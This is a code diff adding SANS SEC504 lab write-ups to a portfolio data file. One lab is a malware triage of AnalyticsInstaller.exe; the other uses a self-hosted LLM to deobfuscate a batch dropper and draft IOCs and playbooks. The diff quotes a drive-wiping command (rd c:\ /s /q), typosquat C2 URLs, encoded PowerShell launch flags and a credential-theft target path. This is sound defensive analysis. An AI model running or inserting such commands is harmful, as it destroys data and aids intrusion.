       {
         title: "Cross-check with dns.log",
         description:
-          "While in the logs directory, grepped dns.log for lolcats.org, another low-severity destination that surfaced in the RITA report. The query returned a single A-record lookup from 172.16.42.2 → 138.68.44.115, NOERROR, type A. Notable but not the priority lead — confirms RITA's prevalence column is sensible.",
+          "While in the logs directory, grepped dns.log for lolcats.org, another low-severity destination that surfaced in the RITA report. The query returned a single A-record lookup from 172.16.42.2 → 138.68.44.115, NOERROR, type A. Notable but not the priority lead, confirms RITA's prevalence column is sensible.",
         command: "cd ~/labs/falsimentis/logs/\ngrep lolcats.org dns.log | head -1",
         screenshot: "/labs/rita-beacon-120314.png",
       },
@@ -2492,6 +2492,494 @@ export const LABS: CybersecurityLab[] = [
       { src: "/labs/rita-beacon-121353.png", alt: "access.log pivot", caption: "POST /collect → ORIGINAL_DST 167.172.201.123 via www1-google-analytics.com" },
       { src: "/labs/rita-beacon-121719.png", alt: "Full proxied requests", caption: "Multiple internal hosts POSTing /collect through the typosquat" },
       { src: "/labs/rita-beacon-121851.png", alt: "awk pivot for compromised hosts", caption: "172.16.42.103/105/107/109 all touching the fake-analytics endpoint" },
+    ],
+  },
+  {
+    id: 23,
+    courseSlug: "sec504",
+    slug: "malware-analysis-analyticsinstaller",
+    title: "Lab 1.3 - Malware Analysis: AnalyticsInstaller.exe",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Malware Analysis",
+    level: "SEC504",
+    date: "May 2026",
+    artifacts: "Sanitized PowerShell, Sysinternals Strings, Regshot, and Process Monitor screenshots from a SEC504 Windows analysis VM",
+    context:
+      "This lab walks the SEC504 triage workflow for an unknown Windows binary (AnalyticsInstaller.exe) using a fast static pass followed by a controlled dynamic detonation. Static analysis fingerprints the file with a hash and pulls human-readable strings to surface embedded URLs, persistence paths, and an encoded PowerShell payload. Dynamic analysis uses Regshot to diff the registry before and after execution and Process Monitor to capture the live process tree, confirming that the installer drops a scheduled task and launches an encoded PowerShell child process.",
+    summary:
+      "Triaged AnalyticsInstaller.exe with a static-then-dynamic workflow: hashed it with Get-FileHash (SHA256 D501EF28...), ran Sysinternals Strings to surface IOCs (www1-google-analytics.com:8088/analytics.exe, an HKCU Run key, a base64 -EncodedCommand PowerShell payload, and a destructive AnalyticsBackup.bat containing 'cmd.exe /c rd c:\\ /s /q'), then detonated it under Regshot and Process Monitor. The Regshot diff caught a new Schedule\\TaskCache\\Tree\\Analytics Backup key, Get-ScheduledTask confirmed the 'Analytics Backup' task, and Procmon's process tree showed the installer spawning cmd.exe → powershell.exe -ExecutionPolicy Bypass -EncodedCommand.",
+    whyThisMatters:
+      "Most incident responders meet malware as a single unexplained binary on a single endpoint. The skill that matters is extracting maximum intelligence from that one file safely and quickly: a hash for threat-intel pivoting, strings for IOCs you can block today, and a controlled detonation that reveals persistence and child processes you would otherwise miss. This lab is the difference between 'we found a weird .exe' and 'here is its hash, its C2, its persistence mechanism, and the destructive payload it was staged to run.'",
+    tldr: [
+      "Static pass: Get-FileHash for IOC pivoting, then Sysinternals Strings exposed a C2 URL, an HKCU Run key, an encoded PowerShell payload, and a wiper batch file (rd c:\\ /s /q)",
+      "Dynamic pass: Regshot before/after diff surfaced a new 'Analytics Backup' scheduled-task registry key; Get-ScheduledTask confirmed it",
+      "Process Monitor process tree confirmed AnalyticsInstaller.exe spawning cmd.exe → powershell.exe -EncodedCommand at runtime",
+    ],
+    skillsDemonstrated: [
+      "Static malware triage (Get-FileHash, Sysinternals Strings)",
+      "IOC extraction from embedded strings",
+      "Encoded-payload and persistence-path recognition",
+      "Dynamic analysis with Regshot registry diffing",
+      "Process Monitor filtering and process-tree reconstruction",
+      "Scheduled-task persistence detection",
+    ],
+    tools: ["PowerShell", "Get-FileHash", "Sysinternals Strings", "Regshot", "Process Monitor (Procmon)", "Get-ScheduledTask"],
+    steps: [
+      "Hash the sample with Get-FileHash (MD5 and SHA256) for threat-intel pivoting",
+      "Pull readable strings: strings.exe -n 10 .\\AnalyticsInstaller.exe",
+      "Read the IOCs out of the strings output (C2 URL, Run key, encoded PowerShell, AnalyticsBackup.bat)",
+      "Take a Regshot first shot of the registry baseline",
+      "Detonate AnalyticsInstaller.exe in the isolated VM",
+      "Confirm the dropped scheduled task with Get-ScheduledTask",
+      "Take the Regshot second shot and compare to surface added keys",
+      "Read the dropped AnalyticsBackup.bat to confirm the destructive payload",
+      "Filter Process Monitor to AnalyticsInstaller.exe and re-detonate",
+      "Find the Process Create event and read the encoded PowerShell command line",
+      "Reconstruct the process tree to confirm the parent/child chain",
+    ],
+    stepDetails: [
+      {
+        title: "Hash the sample",
+        description:
+          "Started with the cheapest, safest evidence: a file hash. Get-FileHash produced an MD5 (5524BDF546472FD66D3450C39CC4E2E5) and SHA256 (D501EF28D4C3F3C308461E5FB51929E3875395C38E6A885692C8788A3C376E45) of AnalyticsInstaller.exe. A hash is the single most portable IOC, ready to drop into VirusTotal, an EDR block list, or a SIEM watchlist before the binary is ever executed.",
+        command: "Get-FileHash -Algorithm MD5 AnalyticsInstaller.exe\nGet-FileHash -Algorithm SHA256 AnalyticsInstaller.exe",
+        commandBreakdown: "-Algorithm MD5/SHA256: choose the digest\nDefault output: Algorithm, Hash, Path",
+        screenshot: "/labs/malware-analysis-083443.png",
+      },
+      {
+        title: "Pull readable strings",
+        description:
+          "Ran Sysinternals Strings (strings.exe -n 10) to dump ASCII and Unicode sequences of 10+ characters from the binary. Even without unpacking, the printable strings leaked the malware's intent in plain text: a C2 URL, a persistence path, and a base64 PowerShell blob.",
+        command: "C:\\tools\\Sysinternals\\strings.exe -n 10 .\\AnalyticsInstaller.exe",
+        commandBreakdown: "-n 10: minimum string length of 10 to cut noise\nStrings dumps both ANSI and Unicode by default",
+        screenshot: "/labs/malware-analysis-083731.png",
+      },
+      {
+        title: "Read the IOCs from the strings",
+        description:
+          "The strings output was a confession. http://www1-google-analytics.com:8088/analytics.exe (a Google Analytics typosquat C2, the same disguise pattern seen in the RITA lab), C:\\Windows\\System32\\analytics.exe (drop path), Software\\Microsoft\\Windows\\CurrentVersion\\Run with an 'Analytics Client' value (Run-key persistence), C:\\Windows\\System32\\AnalyticsBackup.bat, a long powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABt... blob, and cmd.exe /c start /max http://www.midnitemeerkats.com/note. Imported API names (RegOpenKeyExW, RegSetValueExW, RegCloseKey from ADVAPI32) confirmed the binary writes the registry itself.",
+        screenshot: "/labs/malware-analysis-083731.png",
+      },
+      {
+        title: "Regshot first shot",
+        description:
+          "Switched to dynamic analysis. Regshot takes a full snapshot of the registry (and optionally the filesystem) so changes can be diffed after detonation. Configured it to scan C:\\WINDOWS, output to the user profile, then captured the '1st shot' baseline: 395,525 keys and 676,926 values.",
+        screenshot: "/labs/malware-analysis-084010.png",
+      },
+      {
+        title: "Detonate and confirm the scheduled task",
+        description:
+          "Ran AnalyticsInstaller.exe in the isolated VM, then immediately checked for a dropped scheduled task with Get-ScheduledTask. A new task appeared: TaskName 'Analytics Backup', State Ready. Scheduled tasks are a top-tier persistence and execution mechanism precisely because they survive reboots and run on a trigger.",
+        command: ".\\AnalyticsInstaller.exe\nGet-ScheduledTask",
+        screenshot: "/labs/malware-analysis-084444.png",
+      },
+      {
+        title: "Regshot second shot",
+        description:
+          "Took the Regshot '2nd shot' after detonation (67,014 keys / 77,922 values in the changed scope) so Regshot could diff the two snapshots. The before/after diff is what turns 'something changed' into a precise list of exactly which keys and values the malware touched.",
+        screenshot: "/labs/malware-analysis-084538.png",
+      },
+      {
+        title: "Compare the snapshots",
+        description:
+          "Ran the Regshot comparison. The engine walked both snapshots and produced a diff report while the green progress bar ran. Comparing 395K-key baselines against the post-detonation state is exactly the kind of mechanical, high-coverage work that a human could never do by eye.",
+        screenshot: "/labs/malware-analysis-084637.png",
+      },
+      {
+        title: "Read the Regshot diff report",
+        description:
+          "Opened the ~res-x64.txt diff. Keys added: 7, including the smoking gun HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Analytics Backup, alongside the matching Plain and Tasks TaskCache GUID entries. This is the registry footprint of the 'Analytics Backup' scheduled task confirmed independently of Get-ScheduledTask, plus the deleted keys/values from normal Windows churn (WER TermReason entries) that a responder learns to ignore.",
+        screenshot: "/labs/malware-analysis-084831.png",
+      },
+      {
+        title: "Read the dropped batch payload",
+        description:
+          "Used Get-Content to read the dropped C:\\Windows\\SysWOW64\\AnalyticsBackup.bat. Its entire contents: cmd.exe /c rd c:\\ /s /q. That is a destructive wiper: a recursive, quiet, force delete of the C: drive. Naming a drive-wipe 'AnalyticsBackup' and scheduling it as 'Analytics Backup' is deliberate camouflage so a skimming defender reads 'backup' and moves on.",
+        command: "Get-Content C:\\Windows\\SysWOW64\\AnalyticsBackup.bat",
+        screenshot: "/labs/malware-analysis-085841.png",
+      },
+      {
+        title: "Filter Process Monitor",
+        description:
+          "Launched Sysinternals Process Monitor and set a filter: Process Name is AnalyticsInstaller.exe → Include, with the usual analysis-tool noise (Procmon, Procexp, Autoruns, System) excluded. Filtering before detonation keeps the capture focused on the malware's own activity instead of the thousands of events Windows generates per second.",
+        screenshot: "/labs/malware-analysis-090106.png",
+      },
+      {
+        title: "Re-detonate under Procmon",
+        description:
+          "Re-ran AnalyticsInstaller.exe with Process Monitor capturing. The filtered event stream records every file, registry, process, and network operation the binary performs, in order, with full detail.",
+        command: ".\\AnalyticsInstaller.exe",
+        screenshot: "/labs/malware-analysis-090321.png",
+      },
+      {
+        title: "Find the Process Create event",
+        description:
+          "Used Procmon's Find (Ctrl+F) for 'Process Create' to jump straight to the moment the malware spawned a child process, skipping past the file and registry operations to the execution event that matters most.",
+        screenshot: "/labs/malware-analysis-090416.png",
+      },
+      {
+        title: "Read the encoded PowerShell command line",
+        description:
+          "The Process Create event properties revealed the child: C:\\WINDOWS\\SysWOW64\\cmd.exe launching cmd.exe /c powershell.exe -ExecutionPolicy Bypass -EncodedCommand AEkAZgBHAG8... The -EncodedCommand flag takes base64 so the real script never appears in plaintext on the command line, and -ExecutionPolicy Bypass sidesteps script restrictions. This is the runtime confirmation of the encoded blob seen statically in the strings.",
+        screenshot: "/labs/malware-analysis-090518.png",
+      },
+      {
+        title: "Reconstruct the process tree",
+        description:
+          "Opened Procmon's Process Tree to see the full lineage: AnalyticsInstaller.exe (PID 5804), launched by powershell.exe under Explorer, started and exited within ~21 seconds. The tree ties the binary, its parent shell, and its short-lived execution window together into one picture, which is exactly what an IR timeline needs.",
+        screenshot: "/labs/malware-analysis-090553.png",
+      },
+    ],
+    outcome:
+      "Took an unknown Windows binary from 'unexplained .exe' to a full IOC and behavior profile in one sitting. Static analysis gave a hash, a typosquat C2 (www1-google-analytics.com:8088), Run-key persistence, and an encoded PowerShell payload. Dynamic analysis with Regshot proved the 'Analytics Backup' scheduled-task persistence at the registry level, Get-ScheduledTask confirmed the task, the dropped AnalyticsBackup.bat turned out to be a C:-drive wiper, and Process Monitor's process tree caught the cmd.exe → powershell.exe -EncodedCommand execution chain.",
+    nextStepsInProduction:
+      "Push the SHA256 and the network IOCs (www1-google-analytics.com:8088, midnitemeerkats.com) to EDR block lists and the SIEM watchlist immediately. Hunt the fleet for the 'Analytics Backup' scheduled task, the HKCU/HKLM Run 'Analytics Client' value, and any analytics.exe / AnalyticsBackup.bat on disk. Decode the captured base64 -EncodedCommand offline to recover the real PowerShell stage. Given the wiper payload, prioritize containment over observation: isolate any host showing the persistence before the scheduled task fires.",
+    securityControlsRelevant: [
+      "Application control / WDAC to block unsigned binaries from user-writable paths",
+      "PowerShell script-block logging and transcription to capture decoded -EncodedCommand content",
+      "Scheduled-task and Run-key baselining with alerting on new entries",
+      "EDR detonation/behavioral detection for cmd.exe → powershell.exe -EncodedCommand chains",
+      "Egress filtering and DNS monitoring for typosquatted analytics domains",
+      "Tamper-resistant, offline backups to survive a destructive 'rd c:\\ /s /q' payload",
+    ],
+    keyFindings: [
+      "SHA256 D501EF28D4C3F3C308461E5FB51929E3875395C38E6A885692C8788A3C376E45 (MD5 5524BDF546472FD66D3450C39CC4E2E5)",
+      "C2 / payload URL: http://www1-google-analytics.com:8088/analytics.exe (Google Analytics typosquat)",
+      "Persistence: HKCU/HKLM ...\\CurrentVersion\\Run 'Analytics Client' and a 'Analytics Backup' scheduled task",
+      "Dropped wiper: AnalyticsBackup.bat containing cmd.exe /c rd c:\\ /s /q",
+      "Runtime: AnalyticsInstaller.exe → cmd.exe → powershell.exe -ExecutionPolicy Bypass -EncodedCommand",
+    ],
+    takeaway: [
+      "Strings is the highest return-on-effort tool in malware triage and it is almost free. Before unpacking, before a sandbox, before a debugger, a thirty-second strings run on this sample handed over the C2 URL, the persistence path, the encoded payload, and the name of the wiper batch file. Plenty of commodity malware never bothers to encrypt its strings because authors assume nobody will look. Look first; you will often be done before the sandbox finishes booting.",
+      "Regshot is a poor man's EDR for a controlled detonation and it caught the persistence cleanly. Diffing a 395,000-key registry snapshot against the post-execution state is impossible by hand and trivial for the tool, and the 'Analytics Backup' TaskCache key fell straight out of the diff. The discipline that makes this work is taking the baseline before you detonate, every single time, because you only get one clean 'before.'",
+      "The naming was the most instructive part of this sample. 'AnalyticsInstaller', 'Analytics Client', 'Analytics Backup', a typosquat of Google Analytics for C2. Every artifact was named to read as benign telemetry, and the destructive wiper was filed under 'Backup', a word defenders associate with safety. Attackers optimize for the half-second a tired analyst spends reading a name. The defense is mechanical verification: read what the file actually does (rd c:\\ /s /q), not what it is called.",
+    ],
+    screenshots: [
+      { src: "/labs/malware-analysis-083443.png", alt: "Get-FileHash MD5 and SHA256", caption: "Get-FileHash AnalyticsInstaller.exe (SHA256 D501EF28...)" },
+      { src: "/labs/malware-analysis-083731.png", alt: "Sysinternals Strings output", caption: "strings.exe -n 10 surfaces C2 URL, Run key, encoded PowerShell, and AnalyticsBackup.bat" },
+      { src: "/labs/malware-analysis-084010.png", alt: "Regshot first shot", caption: "Regshot 1st shot baseline: 395,525 keys / 676,926 values" },
+      { src: "/labs/malware-analysis-084444.png", alt: "Get-ScheduledTask after detonation", caption: "Dropped scheduled task 'Analytics Backup' shows State Ready" },
+      { src: "/labs/malware-analysis-084538.png", alt: "Regshot second shot", caption: "Regshot 2nd shot captures the post-detonation state to diff" },
+      { src: "/labs/malware-analysis-084637.png", alt: "Regshot comparing", caption: "Regshot diffs the before/after snapshots" },
+      { src: "/labs/malware-analysis-084831.png", alt: "Regshot diff report", caption: "~res-x64.txt: added key Schedule\\TaskCache\\Tree\\Analytics Backup" },
+      { src: "/labs/malware-analysis-085841.png", alt: "AnalyticsBackup.bat contents", caption: "Get-Content AnalyticsBackup.bat → cmd.exe /c rd c:\\ /s /q (wiper)" },
+      { src: "/labs/malware-analysis-090106.png", alt: "Process Monitor filter", caption: "Procmon filter: Process Name is AnalyticsInstaller.exe → Include" },
+      { src: "/labs/malware-analysis-090311.png", alt: "Re-detonate under Procmon", caption: ".\\AnalyticsInstaller.exe captured by Process Monitor" },
+      { src: "/labs/malware-analysis-090321.png", alt: "Procmon event stream", caption: "Filtered Process Monitor capture of the malware's activity" },
+      { src: "/labs/malware-analysis-090416.png", alt: "Procmon Find Process Create", caption: "Find → 'Process Create' to jump to the execution event" },
+      { src: "/labs/malware-analysis-090518.png", alt: "Process Create event properties", caption: "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -EncodedCommand" },
+      { src: "/labs/malware-analysis-090553.png", alt: "Procmon process tree", caption: "AnalyticsInstaller.exe (PID 5804) in the process tree under powershell.exe" },
+    ],
+  },
+  {
+    id: 24,
+    courseSlug: "sec504",
+    slug: "ai-assisted-incident-handling",
+    title: "Lab 1.4 - AI-Assisted Incident Handling",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "AI for Security Operations",
+    level: "SEC504",
+    date: "May 2026",
+    artifacts: "Sanitized screenshots of a self-hosted gpt-4.1 (OpenWebUI) session across three incident-handling use cases",
+    context:
+      "This lab uses a locally hosted LLM (gpt-4.1 served through OpenWebUI, started with the SEC504 goaichat helper) as a force-multiplier across three distinct incident-handling tasks: deobfuscating a heavily obfuscated malicious batch script and extracting its IOCs, generating a PowerShell baseline-collection tool for live response, and drafting a structured incident-response playbook from an Event of Interest. The emphasis is on prompt construction and verification, and on doing all of it against a self-hosted model so sensitive malware and IOCs never leave the analyst's environment.",
+    summary:
+      "Drove a self-hosted gpt-4.1 (OpenWebUI via goaichat at localhost:8080) through three incident-handling jobs. First, uploaded an obfuscated analytics-backup.bat and prompted the model to deobfuscate the variable-fragmented commands step by step, reconstruct the hidden PowerShell, and extract IOCs (genusight.net/collect, genusight.s3.amazonaws.com/XhXrnSbE.exe, %TEMP%\\bitsadmin.exe, a Startup-folder copy, %USERPROFILE%\\.azure\\accessTokens.json credential theft, and an HKCU Run\\BITSAdmin key). Second, had it author BaselineCollector.ps1, a PowerShell 5.1 tool that snapshots services, tasks, users, firewall rules, ports, Run keys, and WMI subscriptions to JSON for Compare-Object diffing, plus usage documentation. Third, seeded it with an expert-IR system prompt and an Event of Interest (a CEO-workstation breach) to generate a MITRE ATT&CK-mapped response playbook.",
+    whyThisMatters:
+      "LLMs are now part of the incident-handler's toolkit whether teams plan for it or not. Used well, a model collapses an hour of manual batch-script deobfuscation into minutes and drafts tooling and playbooks an analyst can refine. Used carelessly, it leaks the very malware and IOCs an investigation is trying to contain into a third-party service, and it hands over confident-but-wrong answers that go unverified. This lab practices the good version: a self-hosted model, deliberate step-by-step prompting, and treating every output as a lead to verify rather than a verdict.",
+    tldr: [
+      "Used a self-hosted gpt-4.1 to deobfuscate a variable-fragmented malicious batch script and extract its full IOC set",
+      "Had the model generate BaselineCollector.ps1 (PowerShell 5.1, JSON output for Compare-Object) plus usage docs for live-response baselining",
+      "Seeded an expert-IR system prompt with an Event of Interest to draft a MITRE ATT&CK-mapped incident-response playbook, all on a local model so malware and IOCs never left the environment",
+    ],
+    skillsDemonstrated: [
+      "AI-assisted malware deobfuscation and IOC extraction",
+      "Prompt engineering for security tasks (role priming, step-by-step decomposition)",
+      "LLM-generated tooling review (PowerShell baseline collector)",
+      "Incident-response playbook development with MITRE ATT&CK mapping",
+      "Operational security of self-hosted LLMs for sensitive data",
+    ],
+    tools: ["gpt-4.1", "OpenWebUI", "goaichat", "Docker", "PowerShell 5.1", "MITRE ATT&CK"],
+    steps: [
+      "Start the local AI stack: goaichat launches Docker + OpenWebUI (gpt-4.1) at localhost:8080",
+      "Review the raw obfuscated sample: cat analytics-backup.bat",
+      "Prompt gpt-4.1 as a Windows malware analyst to deobfuscate the uploaded script",
+      "Ask it to decode the fragmented variables and print the commands one per line",
+      "Ask it to deobfuscate the PowerShell portion step by step (the %QMZA% line)",
+      "Extract a structured IOC list from the deobfuscated commands",
+      "Pivot to tooling: prompt for a PowerShell baseline-collection script using Compare-Object",
+      "Answer the model's clarifying questions to scope the script (coverage, format, version)",
+      "Review the generated BaselineCollector.ps1 and request usage documentation",
+      "Set an expert-IR system prompt for playbook generation",
+      "Provide the Event of Interest (CEO-workstation breach + IOCs) to drive the playbook",
+    ],
+    stepDetails: [
+      {
+        title: "Start the local AI stack",
+        description:
+          "Ran the SEC504 goaichat helper, which starts the Docker service and brings up OpenWebUI (serving gpt-4.1) at http://localhost:8080. Running the model locally is the entire point: malware samples, IOCs, and internal details get pasted into prompts, and a self-hosted model keeps all of that inside the analysis environment instead of shipping it to a third-party API.",
+        command: "goaichat",
+        screenshot: "/labs/ai-incident-handling-102743.png",
+      },
+      {
+        title: "Review the raw obfuscated sample",
+        description:
+          "Looked at analytics-backup.bat first with cat. It is deliberately unreadable: dozens of single-purpose environment variables (set EUJZ=hell, set RBVJ=\"%TEMP%\\bitsadmin.exe\", set KQOT=BITSAdmin, ...) that get concatenated later to assemble the real commands. Reading the analyst's own eyes over the raw file first means you can sanity-check whatever the model claims it says.",
+        command: "cat ~/labs/falsimentis/analytics-backup.bat",
+        screenshot: "/labs/ai-incident-handling-102858.png",
+      },
+      {
+        title: "Prompt for deobfuscation",
+        description:
+          "Attached analytics-backup.bat and primed the model with a role and a tight task: 'You are an expert in Windows malware analysis. Analyze the attached script file. Deobfuscate the script as needed to understand the functionality.' gpt-4.1 identified it as a dropper, explained the variable-fragmentation evasion technique, and began a step-by-step breakdown. Role priming plus a concrete task is what gets a usable answer instead of a hedge.",
+        screenshot: "/labs/ai-incident-handling-103331.png",
+      },
+      {
+        title: "Decode the variables, one command per line",
+        description:
+          "Followed up: 'deobfuscate the script, decoding the variables. Show the commands in the script in deobfuscated form, one command per line.' The model substituted the fragmented variables back into their assembled commands and printed them as discrete lines, which is the form a human can actually reason about and copy into an IOC report.",
+        screenshot: "/labs/ai-incident-handling-103454.png",
+      },
+      {
+        title: "Deobfuscate the PowerShell step by step",
+        description:
+          "Narrowed in on the payload: 'Deobfuscate the PowerShell portion of the script. Show the PowerShell commands in their entirety in deobfuscated form. Slow down and think step-by-step.' The model identified the assembled %QMZA% line and walked the substitution: %BSML%=po, %AMBE%=wers, %EUJZ%=hell → powershell, %UEAI%=-c. Asking it to slow down and decompose is a reliable way to cut confident-but-wrong shortcuts on a long obfuscated string.",
+        screenshot: "/labs/ai-incident-handling-103654.png",
+      },
+      {
+        title: "Extract the IOC list",
+        description:
+          "Asked for a structured deliverable: 'Extract Indicators of compromise from the deobfuscated PowerShell commands and the other batch script commands. Provide the IOCs in a list format.' gpt-4.1 returned Network IOCs (http://genusight.net/collect?th=..., https://genusight.s3.amazonaws.com/XhXrnSbE.exe), File IOCs (%TEMP%\\bitsadmin.exe, a Startup-folder copy for persistence, %USERPROFILE%\\.azure\\accessTokens.json targeted for credential theft), and a Registry IOC (HKCU\\...\\Run\\BITSAdmin). Every one of these still needs analyst verification, but as a starting IOC set it is minutes of work instead of an hour.",
+        screenshot: "/labs/ai-incident-handling-103834.png",
+      },
+      {
+        title: "Prompt for a baseline-collection tool",
+        description:
+          "Switched from analysis to tooling: 'You are an expert PowerShell programmer ... Write a PowerShell script that collects baseline information on the configuration of a Windows host ... output configuration details in multiple files so that later use of the script on systems under investigation can reveal differences ... compared using the PowerShell compare-object command. Do you have any questions for me?' Ending with an explicit invitation for questions turns a one-shot generation into a scoped design conversation.",
+        screenshot: "/labs/ai-incident-handling-104342.png",
+      },
+      {
+        title: "Answer the model's clarifying questions",
+        description:
+          "gpt-4.1 asked the right questions before writing code: which configuration areas to cover (services, users/groups, scheduled tasks, listening ports, firewall rules, RDP, Run/RunOnce keys, installed software) and what output format. A model that asks before generating is far more useful than one that guesses, and it mirrors how a competent engineer would respond to the same request.",
+        screenshot: "/labs/ai-incident-handling-104410.png",
+      },
+      {
+        title: "Scope the script in the reply",
+        description:
+          "Answered with the full scope: cover running services, scheduled tasks, local user/group accounts, enabled firewall rules, listening ports, startup registry keys, installed programs, autoruns, remote-desktop status, and WMI subscriptions; use Compare-Object to diff; JSON output is fine; baseline once on the gold image, collect again on the host under investigation, and compare on an analyst workstation; target PowerShell 5.1. This is the same baseline-and-diff philosophy used manually in the PowerShell live-investigation lab, now codified into a reusable tool.",
+        screenshot: "/labs/ai-incident-handling-104951.png",
+      },
+      {
+        title: "Review the generated tool",
+        description:
+          "The model produced BaselineCollector.ps1: a parameterized script (param OutputFolder), a Save-Json helper wrapping ConvertTo-Json with UTF-8 output, and per-area collection (Get-Service projected to Name/DisplayName/Status/StartType, and so on) written to one JSON file per area under a per-hostname folder. The output is reviewed, not trusted blindly, but it is a working first draft that would have taken real time to write by hand.",
+        screenshot: "/labs/ai-incident-handling-105022.png",
+      },
+      {
+        title: "Request usage documentation",
+        description:
+          "Asked the model to 'Generate documentation on how to use the script ... Show sample usage for collecting data from a baseline system, and for a system under investigation. Show sample commands for comparing the results.' It produced a clean usage guide distinguishing the Baseline (gold image) and Investigation (suspect host) scenarios and showing the Compare-Object commands to diff the two JSON sets.",
+        screenshot: "/labs/ai-incident-handling-105228.png",
+      },
+      {
+        title: "Set the expert-IR system prompt",
+        description:
+          "For the third task, prepared a system prompt in a text file (IRplaybook.txt) that casts the model as an expert-level incident-response analyst whose job is to take an Event of Interest and produce a usable investigation playbook, with references to SANS incident-handling guidance and MITRE ATT&CK (e.g., T1110 Brute Force) and a version-control table. A strong, reusable system prompt is what makes the model's output consistent across investigations.",
+        command: "gedit ~/labs/falsimentis/IRplaybook.txt",
+        screenshot: "/labs/ai-incident-handling-105334.png",
+      },
+      {
+        title: "Load the playbook system prompt",
+        description:
+          "Loaded the IR system prompt into a fresh gpt-4.1 conversation. The prompt instructs the model to slow down, think step-by-step about what a responder actually needs, map techniques to MITRE ATT&CK, and maintain a versioned playbook document.",
+        screenshot: "/labs/ai-incident-handling-105417.png",
+      },
+      {
+        title: "Provide the Event of Interest",
+        description:
+          "The model asked the right scoping question back ('describe the Event of Interest you would like to focus on'), then was given the EOI: multiple IOCs in a breach investigation centered on the CEO workstation, with a malicious batch script and Network IOCs genusight.net and genusight.s3.amazonaws.com/XhXrnSbE.exe, the same indicators recovered in the deobfuscation task. Feeding the model real, structured EOI context is what turns a generic template into a playbook tailored to this incident.",
+        screenshot: "/labs/ai-incident-handling-105700.png",
+      },
+    ],
+    outcome:
+      "Ran a self-hosted gpt-4.1 across the three places an LLM genuinely helps an incident handler: it deobfuscated a variable-fragmented batch dropper and produced a verifiable IOC list in minutes, authored a working BaselineCollector.ps1 plus usage docs for live-response diffing, and drafted a MITRE ATT&CK-mapped response playbook from a CEO-workstation Event of Interest. Every output was treated as a reviewed first draft, and the whole workflow stayed on a local model so the malware and IOCs never left the environment.",
+    nextStepsInProduction:
+      "Standardize on a self-hosted or contractually-isolated model for anything touching malware, IOCs, or internal data, and document that policy so analysts are not pasting samples into consumer chatbots. Keep a versioned library of vetted system prompts (malware analyst, PowerShell tooling, IR playbook author) so output is consistent and reviewable. Treat every model output as a lead: verify extracted IOCs against the actual sample and threat intel, and code-review generated scripts before running them on production hosts. Capture prompts and outputs as investigation artifacts for repeatability and audit.",
+    securityControlsRelevant: [
+      "Self-hosted / data-isolated LLM for any sensitive-data workflow",
+      "Policy prohibiting upload of malware or IOCs to consumer AI services",
+      "Mandatory human review of LLM-generated code before execution",
+      "IOC verification against the source sample and threat intel before action",
+      "Versioned, vetted prompt library for repeatable analysis",
+      "Logging of AI prompts/outputs as investigation artifacts",
+    ],
+    keyFindings: [
+      "gpt-4.1 deobfuscated analytics-backup.bat's variable fragmentation and reconstructed the hidden PowerShell (%QMZA% → powershell -c ...)",
+      "Extracted IOCs: genusight.net/collect, genusight.s3.amazonaws.com/XhXrnSbE.exe, %TEMP%\\bitsadmin.exe, Startup-folder persistence, %USERPROFILE%\\.azure\\accessTokens.json, HKCU Run\\BITSAdmin",
+      "Generated BaselineCollector.ps1 (PowerShell 5.1, JSON output) for Compare-Object live-response diffing, plus usage docs",
+      "Drafted a MITRE ATT&CK-mapped IR playbook (incl. T1110 Brute Force) from a CEO-workstation Event of Interest",
+      "Entire workflow run on a local gpt-4.1 (OpenWebUI/Docker) so malware and IOCs never left the environment",
+    ],
+    takeaway: [
+      "The biggest decision in this lab is invisible in the output: it runs on a self-hosted model. The moment an analyst pastes a malware sample or an internal IOC into a consumer chatbot, that data has left the investigation and may be retained, logged, or trained on. Self-hosting gpt-4.1 in Docker is what makes AI-assisted analysis defensible rather than a data-exfiltration incident of your own making. Capability is the easy part; the operational-security choice is the part that separates a professional workflow from a liability.",
+      "Prompting for security work is a real skill and the lab demonstrates the two highest-value techniques. Role priming ('you are an expert in Windows malware analysis') sets the model's frame, and step-by-step decomposition ('slow down, think step-by-step, one command per line') stops it from taking confident shortcuts on long obfuscated strings. The same model that would hand-wave a single sloppy prompt produces precise variable substitutions when the task is decomposed properly.",
+      "AI is an accelerator, not an oracle, and the discipline is verification. The model's IOC list and generated PowerShell were excellent starting points, but the IOCs still have to be checked against the actual sample and the script still has to be code-reviewed before it runs on a production host. The win is real (an hour of deobfuscation becomes minutes), but it is a win precisely because a skilled analyst is in the loop to catch the cases where the model is confidently wrong.",
+    ],
+    screenshots: [
+      { src: "/labs/ai-incident-handling-102743.png", alt: "goaichat starts OpenWebUI", caption: "goaichat brings up gpt-4.1 (OpenWebUI) at localhost:8080" },
+      { src: "/labs/ai-incident-handling-102858.png", alt: "Raw obfuscated batch", caption: "cat analytics-backup.bat: variable-fragmented obfuscation" },
+      { src: "/labs/ai-incident-handling-103331.png", alt: "Deobfuscation prompt", caption: "Role-primed prompt: 'expert in Windows malware analysis ... deobfuscate'" },
+      { src: "/labs/ai-incident-handling-103454.png", alt: "Decode variables one per line", caption: "Model prints the assembled commands one per line" },
+      { src: "/labs/ai-incident-handling-103654.png", alt: "Step-by-step PowerShell decode", caption: "Deobfuscating the %QMZA% line: %BSML%%AMBE%%EUJZ% = powershell" },
+      { src: "/labs/ai-incident-handling-103834.png", alt: "Extracted IOC list", caption: "IOCs: genusight.net/collect, bitsadmin.exe, accessTokens.json, HKCU Run\\BITSAdmin" },
+      { src: "/labs/ai-incident-handling-104342.png", alt: "Baseline tool prompt", caption: "Prompt for a PowerShell baseline collector using Compare-Object" },
+      { src: "/labs/ai-incident-handling-104410.png", alt: "Model clarifying questions", caption: "gpt-4.1 asks about coverage and output format before coding" },
+      { src: "/labs/ai-incident-handling-104951.png", alt: "Scope reply", caption: "Scoping the script: services, tasks, users, firewall, ports, WMI; PowerShell 5.1" },
+      { src: "/labs/ai-incident-handling-105022.png", alt: "Generated BaselineCollector.ps1", caption: "BaselineCollector.ps1 with Save-Json helper and per-area JSON output" },
+      { src: "/labs/ai-incident-handling-105208.png", alt: "Documentation prompt", caption: "Request for usage documentation with sample commands" },
